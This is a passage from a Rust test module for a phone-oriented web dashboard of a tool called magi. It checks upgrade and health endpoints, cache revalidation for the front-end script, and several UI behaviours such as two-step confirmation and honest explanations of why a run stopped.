        // `[update] mode = "off"` so `updater::Checker::new` returns `None`
        // and the route answers from its own logic.
        //
        // This test used to lean on the fixture's placeholder repo failing
        // config discovery, which left `mode = "notify"` - and a live,
        // unauthenticated call to the GitHub releases API inside a unit test.
        // GitHub allows 60 of those an hour per address, so the suite went red
        // on `macos-latest` and nowhere else, in bursts, and stayed red for as
        // long as somebody kept re-running it: every attempt spent another
        // request. Six reruns across four pull requests were charged to that
        // before it was read as a rate limit rather than a flake.
        //
        // What the assertion is about is the "already current" branch, which
        // is reached by there being no newer release *or* nowhere to look. The
        // second one needs no network and cannot be rate limited.
        let repo = TempDir::new().expect("repo dir");
        std::fs::write(repo.path().join("magi.toml"), "[update]\nmode = \"off\"\n")
            .expect("write magi.toml");
        let fx = Fixture::with_repo(repo.path().to_path_buf()).await;

        // It must answer 200 and leave the process alone: restarting for an
        // upgrade that did not happen parks the run in flight and drops every
        // connection to pay for nothing. A probe against a deck already on the
        // newest build did exactly that, which is how this case got its own
        // branch.
        let res = fx.post("/api/upgrade", None).await;
        assert_eq!(res.status, 200, "not 202: nothing was set in motion");
        let body = res.json();
        assert!(body["to"].is_null(), "there was no release to move to");
        assert!(body["parked"].is_null(), "and nothing was parked");
        assert!(
            body["detail"]
                .as_str()
                .unwrap()
                .contains("nothing restarted"),
            "{body:?}"
        );
    }

    #[tokio::test]
    async fn health_reports_the_running_version_and_no_pending_upgrade_by_default() {
        // `mode = "off"` for the same reason as the test above: a default
        // fixture repo falls back to `mode = "notify"`, which would make this
        // route's new `update` field a live, unauthenticated GitHub call on
        // every assertion in this suite that happens to hit `/api/health`.
        let repo = TempDir::new().expect("repo dir");
        std::fs::write(repo.path().join("magi.toml"), "[update]\nmode = \"off\"\n")
            .expect("write magi.toml");
        let fx = Fixture::with_repo(repo.path().to_path_buf()).await;

        let health = fx.get("/api/health").await.json();
        assert_eq!(health["version"], env!("CARGO_PKG_VERSION"));
        assert_eq!(
            health["update"]["available"], false,
            "checking is off, which reads as \"unknown\", not \"none\""
        );
        assert!(health["update"]["to"].is_null());
        assert!(
            health["upgrade"].is_null(),
            "nothing has ever asked this deck to upgrade"
        );
    }

    #[tokio::test]
    async fn health_reports_a_parked_upgrade_and_what_it_is_waiting_on() {
        let fx = Fixture::start().await;
        write_run(&fx.runs(), "20260905-000000-cd51", RunStatus::Implementing);

        let mut progress = crate::updater::Progress::new("0.5.1".to_owned(), "0.5.2".to_owned());
        progress.parked_run = Some("20260905-000000-cd51".to_owned());
        progress.advance(crate::updater::Stage::Parking);
        crate::updater::write_progress(fx.home.path(), &progress).expect("write upgrade.json");

        let health = fx.get("/api/health").await.json();
        assert_eq!(health["upgrade"]["stage"], "parking");
        assert_eq!(health["upgrade"]["from"], "0.5.1");
        assert_eq!(health["upgrade"]["to"], "0.5.2");
        let waiting_on = health["upgrade"]["waiting_on"]
            .as_str()
            .expect("waiting_on is set while parking a known run");
        assert!(waiting_on.contains("cd51"), "{waiting_on}");
        assert!(waiting_on.contains("implementing"), "{waiting_on}");
    }

    #[tokio::test]
    async fn health_reports_a_finished_upgrade_with_no_waiting_on() {
        let fx = Fixture::start().await;
        let mut progress = crate::updater::Progress::new("0.5.1".to_owned(), "0.5.2".to_owned());
        progress.advance(crate::updater::Stage::Done);
        crate::updater::write_progress(fx.home.path(), &progress).expect("write upgrade.json");

        let health = fx.get("/api/health").await.json();
        assert_eq!(health["upgrade"]["stage"], "done");
        assert!(
            health["upgrade"]["waiting_on"].is_null(),
            "nothing to wait on once it is done"
        );
    }

    #[tokio::test]
    async fn hand_over_advances_the_upgrade_progress_through_parking_and_restarting() {
        let home = TempDir::new().expect("temp home");
        let runs = home.path().join("runs");
        std::fs::create_dir_all(&runs).expect("runs dir");
        let ui = Ui::new(
            Queue::at(home.path().join("queue")),
            Questions::at(home.path().join("questions")),
            Talks::at(home.path().join("talks")),
            runs,
            home.path().to_path_buf(),
            PathBuf::from("/repo/magi"),
        )
        .with_launch(launch_idle);
        let looping = ui.looping();
        let listener = tokio::net::TcpListener::bind((Ipv4Addr::LOCALHOST, 0))
            .await
            .expect("bind loopback");
        let served = tokio::spawn(axum::serve(listener, ui.router()).into_future());

        let progress = crate::updater::Progress::new("0.5.1".to_owned(), "0.5.2".to_owned());
        crate::updater::write_progress(home.path(), &progress).expect("seed progress");

        hand_over(home.path(), &looping, served, || Ok(()))
            .await
            .expect("hand over");

        let after = crate::updater::read_progress(home.path()).expect("progress on disk");
        assert_eq!(
            after.stage,
            crate::updater::Stage::Restarting,
            "hand_over owns the record through parking and up to restarting; \
             the successor is what finishes it"
        );
    }

    #[test]
    fn the_upgrade_button_arms_before_it_restarts_anything() {
        // It ends the process the operator is talking to, and a phone in a
        // pocket taps things. One tap arms, the second commits.
        assert!(APP_JS.contains("upgrade: \"/api/upgrade\""));
        assert!(APP_JS.contains("Replace the binary and restart?"));
        assert!(APP_JS.contains("function confirmed("));
        // Hidden when the loop is somebody else's, matching the 409 above -
        // and hidden with nothing to install, matching the 200 "already
        // current" branch: an operator on the newest build must not be
        // offered a restart that would only park a run for nothing.
        assert!(APP_JS.contains("show(upgradeBtn, !foreign && update.available)"));
        // A park waits for the node in flight, up to an hour for an implement
        // wave. Leaving the button reading "Upgrading…" for that long is the
        // same mistake as an error rendered off screen: it looks wedged.
        assert!(
            APP_JS.contains("Parking, then restarting"),
            "the button says what it is waiting for"
        );
        // And nothing to install must give the button back rather than
        // pretending a restart is coming.
        assert!(APP_JS.contains("if (!out.to)"));
    }

    #[test]
    fn the_running_version_is_shown_regardless_of_whether_an_update_exists() {
        assert!(
            APP_JS.contains("state.health.version"),
            "the operator wants to know what is running even with nothing newer"
        );
        assert!(APP_JS.contains("id=\"daemon-version\"") || APP_CSS.contains(".daemon-version"));
    }

    #[test]
    fn the_upgrade_button_names_its_destination() {
        assert!(
            APP_JS.contains("`Update to ${update.to}`"),
            "pressing the button should not be a surprise about what it moves to"
        );
    }

    #[test]
    fn an_upgrade_in_progress_is_shown_as_stages_not_as_an_error() {
        for stage in ["downloading", "replaced", "parking", "restarting"] {
            assert!(
                APP_JS.contains(&format!("\"{stage}\"")),
                "the phone must be able to tell {stage} apart from the others"
            );
        }
        assert!(APP_JS.contains(".waiting_on"));
        // What replaced the bare "Cannot reach magi: Failed to fetch": a
        // fetch failing while an upgrade is in flight is not an error, it is
        // the sub-second gap `bind_waiting` covers, and it must not be
        // reported as one.
        assert!(APP_JS.contains("function reportUnreachableDuringUpgrade("));
        assert!(APP_JS.contains("reconnects on its own"));
    }

    #[test]
    fn a_failed_upgrade_does_not_lock_the_loop_controls() {
        // `Stage::Failed` is terminal on the server and nothing clears it on
        // its own - not a fresh start, not time passing - so a full-strip
        // takeover for it (the way the busy stages take the strip over,
        // correctly, because those are transient) would have hidden
        // start/stop/park behind an upgrade notice with no way back short of
        // a person editing `upgrade.json` by hand or a later release
        // happening to succeed. The failure must instead ride along as a note
        // next to whatever control the loop's own state already offers.
        let body = &APP_JS[APP_JS.find("function renderLoop(").expect("renderLoop")
            ..APP_JS.find("function upgrade(").expect("upgrade")];
        assert!(
            !body.contains(
                "upgradeStage === \"failed\") {\n    setAttr(box, \"data-state\", \"failed\")"
            ),
            "a failed upgrade must not take the whole strip over the way it used to"
        );
        assert!(
            body.contains("upgradeFailNote"),
            "the failure has to reach the loop's own note instead"
        );
        // `quiet` and `control` are the only two places `loop-why` is set from
        // this function's own state; both must carry the note through, or a
        // future edit to either one would silently drop it again.
        assert_eq!(
            body.matches("upgradeFailNote].filter(Boolean).join")
                .count(),
            2,
            "both loop-why writers (quiet and control) must fold the note in"
        );
    }

    #[test]
    fn an_overdue_upgrade_eventually_asks_for_a_human() {
        // The ceiling has to clear a full hour-long park with room to spare,
        // or an ordinary implement wave would be reported as a stuck upgrade.
        assert!(APP_JS.contains("UPGRADE_WAIT_LIMIT_MS = 70 * 60 * 1000"));
        assert!(APP_JS.contains("function upgradeOverdue("));
    }

    #[test]
    fn coming_back_from_an_upgrade_says_which_version_it_landed_on() {
        assert!(
            APP_JS.contains("Updated to ${upgradeInfo.to"),
            "the operator who asked for the restart wants to know it worked"
        );
    }

    #[test]
    fn an_error_is_visible_from_where_the_button_is() {
        // The alert used to sit in the flow under the header. On a phone
        // scrolled 13 500 px down to a run's action sheet that is off screen,
        // so tapping Resume and being told "the loop is running run b455
        // right now" looked exactly like a button that did nothing.
        let alert = &APP_CSS[APP_CSS.find(".alert {").expect(".alert")
            ..APP_CSS.find(".alert-text").expect(".alert-text")];
        assert!(
            alert.contains("position: fixed"),
            "an error about the thing under your thumb has to be visible from \
             where your thumb is: {alert}"
        );
        assert!(
            alert.contains("z-index: 25"),
            "above the dock (20) and the run-actions FAB (15), so neither \
             buries it: {alert}"
        );
        assert!(
            alert.contains("var(--tap)"),
            "and clear of the dock and the home indicator: {alert}"
        );
        // The FAB sits at the same height on the right. An error that covered
        // it would hide the button the operator reaches for next.
        assert!(
            alert.contains("var(--s4) + var(--tap) + var(--s3)"),
            "the FAB's column stays free: {alert}"
        );
    }

    #[tokio::test]
    async fn an_older_attempt_says_what_replaced_it() {
        let fx = Fixture::start().await;
        let q = fx.queue();
        let runs = fx.runs();
        let (first, second) = ("20260901-000000-aaaa", "20260901-000000-bbbb");
        write_run(&runs, first, RunStatus::Stalled);
        write_run(&runs, second, RunStatus::Blocked);

        let mut t = Task::new(
            "one task".to_owned(),
            "do it".to_owned(),
            PathBuf::from("/repo"),
            Source::Human,
        );
        t.runs = vec![first.to_owned(), second.to_owned()];
        q.put(&mut t).expect("put");

        // Two cards with the same title and no hint which is which was the
        // question: "why are there two of the same, one stalled and one
        // blocked?" The older one now names its replacement.
        let rows = fx.get("/api/runs").await.json();
        let by = |short: &str| -> Value {
            rows.as_array()
                .unwrap()
                .iter()
                .find(|r| r["short"] == short)
                .cloned()
                .unwrap_or(Value::Null)
        };
        assert_eq!(by("aaaa")["superseded_by"], "bbbb");
        assert!(
            by("bbbb")["superseded_by"].is_null(),
            "the latest attempt is not superseded by anything"
        );
        // Front end: the note has to be rendered, not just carried.
        assert!(APP_JS.contains("run.superseded_by"));
        assert!(APP_JS.contains("Superseded by"));
    }

    #[tokio::test]
    async fn a_replaced_deck_is_not_served_from_a_phone_s_cache() {
        let fx = Fixture::start().await;
        // No cache header at all meant browsers invented their own policy,
        // and one did: a phone went on showing "Candidates must be folded
        // before deleting. Run `magi fold` first." - deleted two releases
        // earlier - from a deck that no longer contained the sentence. The
        // button it named was right there, and unreachable.
        let js = fx.get("/app.js").await;
        assert_eq!(js.status, 200);
        let tag = js
            .header("etag")
            .expect("an etag to revalidate against")
            .to_owned();
        assert!(tag.contains(env!("CARGO_PKG_VERSION")), "tag: {tag}");
        assert_eq!(
            js.header("cache-control"),
            Some("no-cache, must-revalidate"),
            "the phone has to ask every time"
        );

        // And the asking has to be cheap, or `must-revalidate` just means
        // "send the whole interface on every load".
        let again = fx
            .get_with("/app.js", &[("if-none-match", tag.as_str())])
            .await;
        assert_eq!(
            again.status, 304,
            "a deck it already has costs one round trip"
        );
        assert!(again.body.is_empty(), "304 carries no body");

        // A weakened tag from a proxy still matches; a different build does
        // not, which is the case that has to deliver the new interface.
        let weak = fx
            .get_with("/app.js", &[("if-none-match", &format!("W/{tag}"))])
            .await;
        assert_eq!(weak.status, 304);
        let stale = fx
            .get_with("/app.js", &[("if-none-match", "\"0.0.1-1\"")])
            .await;
        assert_eq!(stale.status, 200, "an older build must be replaced");
        assert!(stale.body.contains("renderRunActions"));
    }

    #[test]
    fn the_deck_never_sends_the_operator_to_a_terminal() {
        // The whole point of the phone UI is that a terminal is not needed.
        // The delete control used to answer with "Run `magi fold` first."
        assert!(
            !APP_JS.contains("Run `magi fold` first"),
            "the deck must offer the fold, not prescribe a shell command"
        );
        assert!(APP_JS.contains("foldRun:"));
        assert!(APP_JS.contains("resumeRun:"));
        assert!(APP_JS.contains("renderRunActions"));

        // Folding is destructive and armed in two steps, like deleting.
        assert!(APP_JS.contains("armedFold"));
        assert!(APP_JS.contains("Yes, fold worktrees"));

        // And the copy has to say that the two actions are opposites, because
        // folding throws away exactly what a resume would continue from.
        assert!(APP_JS.contains("can no longer be resumed"));
    }

    #[test]
    fn a_finished_run_explains_itself_with_its_own_last_line() {
        // The deck used to answer "why did this stop?" with a sentence chosen
        // by status alone. Run e633 stalled because two judges answered with
        // the wrong JSON shape and its card said "The panel collapsed on
        // agent quota" - with `quota: []` in the record and a quota-loss
        // counter right above it that correctly said nothing.
        assert!(
            !APP_JS.contains("collapsed on agent quota"),
            "a stall must not be explained by a cause the deck did not check"
        );
        assert!(
            !APP_JS.contains("Review rounds ran out with findings still open, or the gate failed"),
            "and a block must not offer a guess with an `or` in it"
        );

        // The reason it does have is `run.event`, which must reach finished
        // runs: gating it on movement hid the recorded truth at the one moment
        // the operator is reading the card to find out what happened.
        assert!(
            APP_JS.contains("setText(r.event, run.event || \"\")"),
            "the run's last line is rendered unconditionally"
        );
        assert!(
            !APP_JS.contains("moving && run.event"),
            "and never gated on the run still moving"
        );

        // Quota keeps its own counter, fed by the number actually recorded.
        assert!(APP_JS.contains("lost to quota"));
    }
}
